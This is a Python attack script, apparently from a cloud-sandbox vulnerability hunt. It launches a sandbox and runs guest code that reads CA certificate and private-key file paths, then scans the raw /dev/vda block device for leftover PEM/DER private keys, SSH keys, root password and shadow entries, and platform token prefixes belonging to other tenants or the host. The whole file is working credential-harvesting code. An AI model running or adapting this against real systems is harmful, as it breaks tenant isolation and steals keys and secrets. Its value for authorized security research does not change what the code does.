# -*- coding: utf-8 -*-
"""Phase38: 段3(14-22GB)重扫 + CA证书周边私钥搜索 + DER私钥特征 + 本沙箱CA证据"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os, re

# 0) local CA cert: proves whether each sandbox CA is persisted to vda
try:
    pem = open('/run/cell/ca-cert.pem', 'rb').read()
    print('[local ca-cert] len=%d' % len(pem), flush=True)
    m = re.search(rb'Serial Number:\s*([0-9a-fA-F:]+)', pem)
    print('[local serial] %r' % (m.group(1) if m else b'?'), flush=True)
    print(pem[:600].decode('latin1', 'replace'), flush=True)
except Exception as e:
    print('[local ca] EXC %s' % e, flush=True)

# 0b) local private key files: are they readable?
for p in ['/run/cell/ca.key', '/run/cell/ca-cert.key', '/run/cell/private.key',
          '/run/cell/key.pem', '/run/vercel/share/ca.key', '/etc/cell/ca.key']:
    try:
        d = open(p, 'rb').read(300)
        print('[file %s] %r' % (p, d[:200]), flush=True)
    except Exception as e:
        print('[file %s] %s' % (p, str(e)[:60]), flush=True)

fd = os.open('/dev/vda', os.O_RDONLY)

# 1) fwtest14 CA at 0x841c5000: scan surroundings for private key (unmeasured before)
for delta in [-16384, -8192, -4096, -512, 0, 512, 4096, 8192, 16384, 32768]:
    try:
        chunk = os.pread(fd, 4096, 0x841c5000 + delta)
    except Exception as e:
        print('[ctx delta=%d] EXC %s' % (delta, e), flush=True)
        continue
    txt = chunk.replace(b'\x00', b' ')
    if b'KEY' in txt or b'BEGIN' in txt or b'PEM' in txt or b'key' in txt:
        print('[ctx delta=%d] %r' % (delta, txt[:700]), flush=True)

# 2) scan segment 3: 14GB - 22GB
# DER EC private key: OID 1.2.840.10045.2.1 + 0x04 0x20 (32-byte key)
EC_PK = b'\x2a\x86\x48\xce\x3d\x02\x01\x06\x08\x2a\x86\x48\xce\x3d\x03\x01\x07\x04\x20'
# PKCS8 RSA: rsaEncryption OID + sequence
RSA_PK = b'\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x04\x82'
KEYS = [
    (b'BEGIN EC PRIVATE KEY', 'PEM_EC'),
    (b'BEGIN RSA PRIVATE KEY', 'PEM_RSA'),
    (b'BEGIN PRIVATE KEY', 'PEM_PKCS8'),
    (b'BEGIN OPENSSH PRIVATE KEY', 'PEM_SSH'),
    (b'ca.key', 'ca.key'),
    (b'cert.key', 'cert.key'),
    (b'proxy-ca', 'proxy-ca'),
    (b'root:x:0:0', 'passwd_root'),
    (b'ssh-rsa', 'ssh-rsa'),
    (b'ssh-ed25519', 'ssh-ed25519'),
    (b'authorized_keys', 'auth_keys'),
    (b'shadow', 'shadow'),
    (b'sbx_', 'sbx_'),
    (b'team_', 'team_'),
    (b'vcp_', 'vcp_'),
    (b'Vercel Network Proxy CA', 'CA_NAME'),
    (EC_PK, 'DER_EC_KEY'),
    (RSA_PK, 'DER_RSA_KEY'),
]
start = 14 * 1024 * 1024 * 1024
end = 22 * 1024 * 1024 * 1024
hits = {}
total = 0
for off in range(start, end, 4 * 1024 * 1024):
    try:
        chunk = os.pread(fd, 4 * 1024 * 1024, off)
    except Exception:
        break
    total += len(chunk)
    for k, name in KEYS:
        idx = 0
        while True:
            idx = chunk.find(k, idx)
            if idx < 0:
                break
            hits.setdefault(name, []).append(off + idx)
            idx += len(k)
os.close(fd)
print('[scan3] total=%d MB' % (total // 1024 // 1024), flush=True)
for k, v in hits.items():
    print('== %s (%d) ==' % (k, len(v)), flush=True)
    for item in v[:15]:
        print('   off=0x%x' % item, flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg46.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg46.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest16")
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=200000)
    print('cmd:', c, flush=True)
    print(r[:14000], flush=True)
